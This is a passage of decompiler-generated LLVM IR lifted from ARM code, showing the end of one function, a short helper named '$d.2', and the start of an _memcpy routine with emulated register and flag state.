  store i32 %v0_1898c, i32* %v3_1898c, align 4
  %v0_18990 = load i32, i32* %r6.global-to-local, align 4
  %v1_18990 = add i32 %v0_18990, 12
  store i32 %v1_18990, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18994

dec_label_pc_18994:                               ; preds = %dec_label_pc_1890c, %.thread127, %dec_label_pc_18974
  %v1_189a0.pre = phi i32 [ %v2_1844c, %.thread127 ], [ %v1_18990, %dec_label_pc_18974 ], [ %v1_189a0.pre.pre, %dec_label_pc_1890c ]
  %v2_18994 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_18994, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18998

dec_label_pc_18998:                               ; preds = %dec_label_pc_18998, %dec_label_pc_18994
  %v0_18998 = phi i32 [ %v2_18994, %dec_label_pc_18994 ], [ %v4_18998, %dec_label_pc_18998 ]
  %stack_var_-188.0 = phi i32 [ %v3_182fc, %dec_label_pc_18994 ], [ %v2_189a4, %dec_label_pc_18998 ]
  %v1_18998 = inttoptr i32 %v0_18998 to i32*
  %v2_18998 = load i32, i32* %v1_18998, align 4
  store i32 %v2_18998, i32* %r3.global-to-local, align 4
  %v4_18998 = add i32 %v0_18998, 12
  store i32 %v4_18998, i32* %r2.global-to-local, align 4
  %v3_189a0 = icmp ult i32 %v4_18998, %v1_189a0.pre
  %v2_189a4 = sub i32 %stack_var_-188.0, %v2_18998
  store i32 %v2_189a4, i32* %r0.global-to-local, align 4
  br i1 %v3_189a0, label %dec_label_pc_18998, label %dec_label_pc_189b0

dec_label_pc_189b0:                               ; preds = %dec_label_pc_18998
  %v3_189b0 = load i8, i8* %stack_var_-42, align 1
  %v4_189b0 = sext i8 %v3_189b0 to i32
  store i32 %v4_189b0, i32* %r3.global-to-local, align 4
  store i32 %v4_189b0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_189b4 = icmp slt i8 %v3_189b0, 0
  store i1 %v1_189b4, i1* %cpsr_n.global-to-local, align 1
  %v2_189b4 = icmp eq i8 %v3_189b0, 0
  store i1 %v2_189b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189b4, label %bb270, label %bb269

bb269:                                            ; preds = %dec_label_pc_189b0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb270

bb270:                                            ; preds = %dec_label_pc_189b0, %bb269
  %v1_18a08 = phi i32 [ %v4_189b0, %dec_label_pc_189b0 ], [ 1, %bb269 ]
  %v2_189bc = sub i32 %v2_189a4, %v1_18a08
  store i32 %v2_189bc, i32* %r1.global-to-local, align 4
  %v2_189c0 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_189c0, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_189c8 = icmp slt i32 %v2_189bc, 0
  store i1 %v1_189c8, i1* %cpsr_n.global-to-local, align 1
  %v2_189c8 = icmp eq i32 %v2_189bc, 0
  store i1 %v2_189c8, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp271 = icmp slt i32 %v2_189bc, 1
  br i1 %tmp271, label %dec_label_pc_18a30, label %dec_label_pc_189dc

dec_label_pc_189dc:                               ; preds = %bb270
  %v2_189dc = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_189dc, i32* %ip.global-to-local, align 4
  %v1_189e0 = add i32 %v2_189dc, 12
  %v2_189e0 = inttoptr i32 %v1_189e0 to i32*
  %v3_189e0 = load i32, i32* %v2_189e0, align 4
  store i32 %v3_189e0, i32* %r3.global-to-local, align 4
  %v1_189e4 = and i32 %v3_189e0, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_189e4 = icmp eq i32 %v1_189e4, 0
  store i1 %v2_189e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189e4, label %dec_label_pc_189fc, label %dec_label_pc_189ec

dec_label_pc_189ec:                               ; preds = %dec_label_pc_189dc
  store i32 ptrtoint (i32* @global_var_22f7b.1556 to i32), i32* %r3.global-to-local, align 4
  %v1_189f0 = add i32 %v1_189a0.pre, 12
  store i32 %v1_189f0, i32* %r5.global-to-local, align 4
  %v1_189f4 = inttoptr i32 %v1_189a0.pre to i32*
  store i32 160, i32* %v1_189f4, align 4
  %v3_189f4 = add i32 %v1_189a0.pre, 4
  %v4_189f4 = inttoptr i32 %v3_189f4 to i32*
  %v5_189f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_189f4, i32* %v4_189f4, align 4
  %v6_189f4 = add i32 %v1_189a0.pre, 8
  %v7_189f4 = inttoptr i32 %v6_189f4 to i32*
  %v8_189f4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_189f4, i32* %v7_189f4, align 4
  br label %dec_label_pc_18a34

dec_label_pc_189fc:                               ; preds = %dec_label_pc_189dc
  store i32 %v2_189dc, i32* %r0.global-to-local, align 4
  %v1_18a00 = add i32 %v2_189dc, 16
  %v2_18a00 = inttoptr i32 %v1_18a00 to i32*
  %v3_18a00 = load i32, i32* %v2_18a00, align 4
  store i32 %v3_18a00, i32* %r3.global-to-local, align 4
  %v1_18a04 = add i32 %v3_18a00, -48
  %v3_18a04 = sub i32 47, %v3_18a00
  %v4_18a04 = and i32 %v3_18a04, %v3_18a00
  %v5_18a04 = icmp slt i32 %v4_18a04, 0
  store i1 %v5_18a04, i1* %cpsr_v.global-to-local, align 1
  %v6_18a04 = icmp slt i32 %v1_18a04, 0
  store i1 %v6_18a04, i1* %cpsr_n.global-to-local, align 1
  %v7_18a04 = icmp eq i32 %v3_18a00, 48
  store i1 %v7_18a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a04, label %dec_label_pc_18a14, label %bb272

bb272:                                            ; preds = %dec_label_pc_189fc
  store i32 %v2_189a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18a30

dec_label_pc_18a14:                               ; preds = %dec_label_pc_189fc
  %v3_18a14 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_189a0.pre, i32* %r5.global-to-local, align 4
  %v2_18a1c = add i32 %v3_18a14, %v2_189bc
  store i32 %v2_18a1c, i32* %r3.global-to-local, align 4
  store i32 %v2_18a1c, i32* %stack_var_-160, align 4
  br label %dec_label_pc_18a34

dec_label_pc_18a28:                               ; preds = %dec_label_pc_18a3c
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18a6c

dec_label_pc_18a30:                               ; preds = %bb272, %bb270
  store i32 %v1_189a0.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a14, %dec_label_pc_189ec, %dec_label_pc_18a30
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_18a38 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_18a38, i32* %r4.global-to-local, align 4
  %v3_18a44.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_18a3c

dec_label_pc_18a3c:                               ; preds = %dec_label_pc_18a64, %dec_label_pc_18a34
  %v0_18a3c = phi i32 [ %v1_18a5c, %dec_label_pc_18a64 ], [ %v2_18a38, %dec_label_pc_18a34 ]
  %v1_18a3c = inttoptr i32 %v0_18a3c to i32*
  %v2_18a3c = load i32, i32* %v1_18a3c, align 4
  store i32 %v2_18a3c, i32* %r1.global-to-local, align 4
  %v3_18a3c = add i32 %v0_18a3c, 4
  %v4_18a3c = inttoptr i32 %v3_18a3c to i32*
  %v5_18a3c = load i32, i32* %v4_18a3c, align 4
  store i32 %v5_18a3c, i32* %r2.global-to-local, align 4
  %v6_18a3c = add i32 %v0_18a3c, 8
  %v7_18a3c = inttoptr i32 %v6_18a3c to i32*
  %v8_18a3c = load i32, i32* %v7_18a3c, align 4
  store i32 %v8_18a3c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_18a44.pre, i32* %ip.global-to-local, align 4
  store i32 100944, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_18a44.pre)
  %v0_18a50 = load i32, i32* %r4.global-to-local, align 4
  %v1_18a50 = add i32 %v0_18a50, 4
  %v2_18a50 = inttoptr i32 %v1_18a50 to i32*
  %v3_18a50 = load i32, i32* %v2_18a50, align 4
  store i32 %v3_18a50, i32* %r3.global-to-local, align 4
  %v0_18a54 = load i32, i32* %r0.global-to-local, align 4
  %v2_18a54 = sub i32 %v0_18a54, %v3_18a50
  %v4_18a54 = xor i32 %v0_18a54, %v3_18a50
  %v5_18a54 = xor i32 %v2_18a54, %v0_18a54
  %v6_18a54 = and i32 %v5_18a54, %v4_18a54
  %v7_18a54 = icmp slt i32 %v6_18a54, 0
  store i1 %v7_18a54, i1* %cpsr_v.global-to-local, align 1
  %v8_18a54 = icmp slt i32 %v2_18a54, 0
  store i1 %v8_18a54, i1* %cpsr_n.global-to-local, align 1
  %v9_18a54 = icmp eq i32 %v0_18a54, %v3_18a50
  store i1 %v9_18a54, i1* %cpsr_z.global-to-local, align 1
  %v0_18a58 = load i32, i32* %r6.global-to-local, align 4
  %v2_18a58 = add i32 %v0_18a58, %v0_18a54
  store i32 %v2_18a58, i32* %r6.global-to-local, align 4
  %v1_18a5c = add i32 %v0_18a50, 12
  store i32 %v1_18a5c, i32* %r4.global-to-local, align 4
  br i1 %v9_18a54, label %dec_label_pc_18a64, label %dec_label_pc_18a28

dec_label_pc_18a64:                               ; preds = %dec_label_pc_18a3c
  %v1_18a64 = load i32, i32* %r5.global-to-local, align 4
  %v2_18a64 = sub i32 %v1_18a5c, %v1_18a64
  %v3_18a64 = icmp ult i32 %v1_18a5c, %v1_18a64
  %v4_18a64 = xor i32 %v1_18a64, %v1_18a5c
  %v5_18a64 = xor i32 %v2_18a64, %v1_18a5c
  %v6_18a64 = and i32 %v5_18a64, %v4_18a64
  %v7_18a64 = icmp slt i32 %v6_18a64, 0
  store i1 %v7_18a64, i1* %cpsr_v.global-to-local, align 1
  %v8_18a64 = icmp slt i32 %v2_18a64, 0
  store i1 %v8_18a64, i1* %cpsr_n.global-to-local, align 1
  %v9_18a64 = icmp eq i32 %v1_18a5c, %v1_18a64
  store i1 %v9_18a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18a64, label %dec_label_pc_18a3c, label %dec_label_pc_18a6c

dec_label_pc_18a6c:                               ; preds = %dec_label_pc_18a64, %dec_label_pc_18a28
  %v0_18a6c = phi i32 [ -1, %dec_label_pc_18a28 ], [ %v2_18a58, %dec_label_pc_18a64 ]
  store i32 %v0_18a6c, i32* %r0.global-to-local, align 4
  %v2_18a74 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_18a74, i32* %r4.global-to-local, align 4
  ret i32 %v0_18a6c

; uselistorder directives
  uselistorder i32 %v0_18a6c, { 1, 0 }
  uselistorder i32 %v2_18a64, { 1, 0 }
  uselistorder i32 %v1_18a64, { 2, 0, 1, 3 }
  uselistorder i32 %v1_18a5c, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_18a54, { 1, 0 }
  uselistorder i32 %v0_18a54, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_18a50, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18a3c, { 2, 1, 0 }
  uselistorder i32 %v3_18a00, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_189dc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_189a4, { 0, 1, 3, 2 }
  uselistorder i32 %v4_18998, { 1, 2, 0 }
  uselistorder i32 %v0_18998, { 1, 0 }
  uselistorder i32 %v1_189a0.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_18958, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_18954, { 2, 1, 0 }
  uselistorder i32 %storemerge180, { 1, 0 }
  uselistorder i32 %v0_18918, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1890c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_188e8, { 1, 0 }
  uselistorder i32 %v2_188e0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_188d8, { 1, 0 }
  uselistorder i32 %v0_188d0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_188b8, { 1, 0 }
  uselistorder i32 %v1_18894, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18894, { 1, 0, 2 }
  uselistorder i32 %v0_1886c, { 3, 0, 1, 2 }
  uselistorder i1 %v2_1884c, { 2, 1, 0 }
  uselistorder i32 %v2_187d8, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_187c8, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_188f0, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_18834, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_18774, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_18758, { 1, 0 }
  uselistorder i32 %v1_18750, { 1, 2, 0 }
  uselistorder i32 %v2_18744, { 1, 0 }
  uselistorder i32 %v1_18744, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18744, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_1873c, { 1, 0, 2 }
  uselistorder i32 %v0_18734, { 3, 0, 1, 2 }
  uselistorder i1 %v3_18714, { 1, 0 }
  uselistorder i32 %v2_18714, { 1, 0 }
  uselistorder i32 %v2_18710, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_186fc, { 1, 0 }
  uselistorder i32 %v1_18700, { 2, 1, 0 }
  uselistorder i1 %v2_186f0, { 1, 0 }
  uselistorder i32 %v0_186ec, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_186d4, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_186c8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_18680, { 1, 2, 0 }
  uselistorder i32 %v2_1867c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18664, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_1865c, { 1, 0 }
  uselistorder i32 %v0_18668, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_18644, { 1, 0 }
  uselistorder i32 %v0_18630, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_18624, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18618, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_18614, { 0, 1, 3, 2 }
  uselistorder i32 %v0_185cc, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1851c, { 1, 0 }
  uselistorder i32 %v11_184f8, { 1, 2, 0 }
  uselistorder double %v9_184f8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_184a4, { 1, 0 }
  uselistorder i32 %v1_18490, { 3, 2, 0, 1 }
  uselistorder i32 %v0_184f0, { 1, 0 }
  uselistorder i32 %v5_1843c, { 1, 0 }
  uselistorder i32 %v0_18428, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_18348.v1_1835c8, { 1, 0 }
  uselistorder i1 %not.v7_18350, { 1, 0 }
  uselistorder i1 %v7_18350, { 1, 2, 0 }
  uselistorder i32 %v1_18660, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_182bc, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 5, 6, 7, 4, 8, 2, 9, 10, 3, 11 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 0, 8, 9, 10, 11 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 57, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 1, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 10, 11, 12, 7, 8, 9, 13, 14, 15, 17, 16, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 13, 14, 15, 16, 17, 18, 6, 19, 20, 30, 28, 29, 31, 21, 22, 27, 23, 24, 11, 32, 25, 26, 5, 33, 34, 1, 7, 4, 3, 2, 35, 36, 10, 12, 8, 9, 37, 38, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 14, 12, 13, 15, 16, 0, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 34, 1, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 1, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 1, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 5, 0, 6, 3, 1, 7, 4 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 17, { 22, 0, 13, 14, 1, 15, 16, 2, 17, 3, 18, 4, 19, 5, 20, 24, 23, 7, 8, 9, 6, 10, 11, 12, 21 }
  uselistorder i32 102, { 4, 0, 1, 5, 6, 2, 7, 3 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000022F7B) to float) to i32), { 1, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder i32 96, { 2, 3, 0, 1 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 5, 4, 3, 2, 7, 6, 8, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 5, 4, 3, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder double %arg2, { 0, 1, 5, 6, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_18a34, { 2, 0, 1 }
  uselistorder label %bb270, { 1, 0 }
  uselistorder label %dec_label_pc_18994, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1890c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_188e0, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_188b8, { 1, 0 }
  uselistorder label %dec_label_pc_18894, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18878, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18844, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18840, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1879c, { 1, 0 }
  uselistorder label %bb257, { 1, 0 }
  uselistorder label %dec_label_pc_1878c, { 1, 0 }
  uselistorder label %dec_label_pc_18780, { 1, 0 }
  uselistorder label %bb251, { 1, 0 }
  uselistorder label %bb249, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %.thread162, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb238, { 1, 0 }
  uselistorder label %dec_label_pc_186a0, { 2, 1, 0 }
  uselistorder label %bb235, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_185c8, { 1, 0 }
  uselistorder label %dec_label_pc_18588, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_18418, { 1, 0 }
  uselistorder label %dec_label_pc_18334, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18a78:
  %v0_18a8c = load i1, i1* @cpsr_n, align 1
  br i1 %v0_18a8c, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_18a78
  %v0_18a98.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a98.pr, label %bb8, label %.thread2

bb:                                               ; preds = %dec_label_pc_18a78
  %v1_18a90 = load i32, i32* @r4, align 4
  %v3_18a90 = xor i32 %v1_18a90, %arg1
  %v2_18a94 = sub i32 -1, %v3_18a90
  %v4_18a94 = icmp eq i32 %v3_18a90, -1
  br i1 %v4_18a94, label %bb8, label %.thread2

bb8:                                              ; preds = %bb, %thread-pre-split
  %v7_18a9c6 = phi i32 [ %v2_18a94, %bb ], [ %arg1, %thread-pre-split ]
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb8
  %v7_18a9c = phi i32 [ %v2_18a94, %bb ], [ %arg1, %thread-pre-split ], [ %v7_18a9c6, %bb8 ]
  ret i32 %v7_18a9c

; uselistorder directives
  uselistorder i32 %v2_18a94, { 1, 0 }
  uselistorder i32 %v3_18a90, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18aa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18aa0 = load i32, i32* %r0.global-to-local, align 4
  %v2_18aa0 = sub i32 %v0_18aa0, %v1_18aa0
  %v3_18aa0 = icmp ult i32 %v0_18aa0, %v1_18aa0
  %v4_18aa0 = xor i32 %v1_18aa0, %v0_18aa0
  %v5_18aa0 = xor i32 %v2_18aa0, %v0_18aa0
  %v6_18aa0 = and i32 %v5_18aa0, %v4_18aa0
  %v7_18aa0 = icmp slt i32 %v6_18aa0, 0
  store i1 %v7_18aa0, i1* %cpsr_v.global-to-local, align 1
  %v8_18aa0 = icmp slt i32 %v2_18aa0, 0
  store i1 %v8_18aa0, i1* %cpsr_n.global-to-local, align 1
  %v9_18aa0 = icmp eq i32 %v0_18aa0, %v1_18aa0
  store i1 %v9_18aa0, i1* @cpsr_z, align 1
  br i1 %v3_18aa0, label %dec_label_pc_18cec, label %dec_label_pc_18aa8

dec_label_pc_18aa8:                               ; preds = %entry
  br i1 %v9_18aa0, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_18aa8
  %merge = phi i32 [ %v0_18aa0, %dec_label_pc_18aa8 ], [ %v2_18d80, %bb143 ], [ %v11_18d9c, %bb146 ], [ %v7_18d9c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18aa8
  %v5_18aac = inttoptr i32 %v1_18aa0 to i8*
  store i8* %v5_18aac, i8** %stack_var_-8, align 4
  %v0_18ab0 = load i32, i32* @r2, align 4
  %v2_18ab0 = add i32 %v0_18ab0, -4
  store i32 %v2_18ab0, i32* %r2.global-to-local, align 4
  %v4_18ab0 = sub i32 3, %v0_18ab0
  %v5_18ab0 = and i32 %v4_18ab0, %v0_18ab0
  %v6_18ab0 = icmp slt i32 %v5_18ab0, 0
  store i1 %v6_18ab0, i1* %cpsr_v.global-to-local, align 1
  %v7_18ab0 = icmp slt i32 %v2_18ab0, 0
  store i1 %v7_18ab0, i1* %cpsr_n.global-to-local, align 1
  %v5_18ab4 = icmp slt i32 %v0_18ab0, 4
  br i1 %v5_18ab4, label %bb133, label %dec_label_pc_18ab8

dec_label_pc_18ab8:                               ; preds = %bb
  %v1_18ab8 = urem i32 %v1_18aa0, 4
  store i32 %v1_18ab8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18ab8 = icmp eq i32 %v1_18ab8, 0
  br i1 %v2_18ab8, label %dec_label_pc_18ac0, label %dec_label_pc_18b64

dec_label_pc_18ac0:                               ; preds = %dec_label_pc_18ab8
  %v1_18ac0 = urem i32 %v0_18aa0, 4
  store i32 %v1_18ac0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18ac0 = icmp eq i32 %v1_18ac0, 0
  %extract.t = trunc i32 %v0_18aa0 to i2
  br i1 %v2_18ac0, label %dec_label_pc_18ac8, label %dec_label_pc_18b94

dec_label_pc_18ac8:                               ; preds = %dec_label_pc_18ac0, %dec_label_pc_18b8c
  %v0_18ae093 = phi i32 [ %v1_18aa0, %dec_label_pc_18ac0 ], [ %v0_18bdc76, %dec_label_pc_18b8c ]
  %v0_18adc92 = phi i32 [ %v0_18aa0, %dec_label_pc_18ac0 ], [ %v0_18b8c, %dec_label_pc_18b8c ]
  %v0_18ac8 = phi i32 [ %v2_18ab0, %dec_label_pc_18ac0 ], [ %v2_18b84, %dec_label_pc_18b8c ]
  %v2_18ac8 = add i32 %v0_18ac8, -8
  store i32 %v2_18ac8, i32* %r2.global-to-local, align 4
  %v4_18ac8 = sub i32 7, %v0_18ac8
  %v5_18ac8 = and i32 %v4_18ac8, %v0_18ac8
  %v6_18ac8 = icmp slt i32 %v5_18ac8, 0
  store i1 %v6_18ac8, i1* %cpsr_v.global-to-local, align 1
  %v7_18ac8 = icmp slt i32 %v2_18ac8, 0
  store i1 %v7_18ac8, i1* %cpsr_n.global-to-local, align 1
  %v5_18acc = icmp slt i32 %v0_18ac8, 8
  br i1 %v5_18acc, label %dec_label_pc_18b1c, label %dec_label_pc_18ad0

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_18ac8
  %v2_18ad0 = add i32 %v0_18ac8, -28
  store i32 %v2_18ad0, i32* %r2.global-to-local, align 4
  %v4_18ad0 = sub i32 27, %v0_18ac8
  %v5_18ad0 = and i32 %v4_18ad0, %v2_18ac8
  %v6_18ad0 = icmp slt i32 %v5_18ad0, 0
  store i1 %v6_18ad0, i1* %cpsr_v.global-to-local, align 1
  %v7_18ad0 = icmp slt i32 %v2_18ad0, 0
  store i1 %v7_18ad0, i1* %cpsr_n.global-to-local, align 1
  %v5_18ad4 = icmp slt i32 %v2_18ac8, 20
  br i1 %v5_18ad4, label %dec_label_pc_18b08, label %dec_label_pc_18ad8

dec_label_pc_18ad8:                               ; preds = %dec_label_pc_18ad0
  %v0_18ad8 = load i32, i32* @r4, align 4
  store i32 %v0_18ad8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18adc

dec_label_pc_18adc:                               ; preds = %dec_label_pc_18adc.dec_label_pc_18adc_crit_edge, %dec_label_pc_18ad8
  %v0_18ae0 = phi i32 [ %v12_18ae8, %dec_label_pc_18adc.dec_label_pc_18adc_crit_edge ], [ %v0_18ae093, %dec_label_pc_18ad8 ]
  %v0_18adc = phi i32 [ %v0_18adc.pre, %dec_label_pc_18adc.dec_label_pc_18adc_crit_edge ], [ %v0_18adc92, %dec_label_pc_18ad8 ]
  %v1_18adc = inttoptr i32 %v0_18adc to i32*
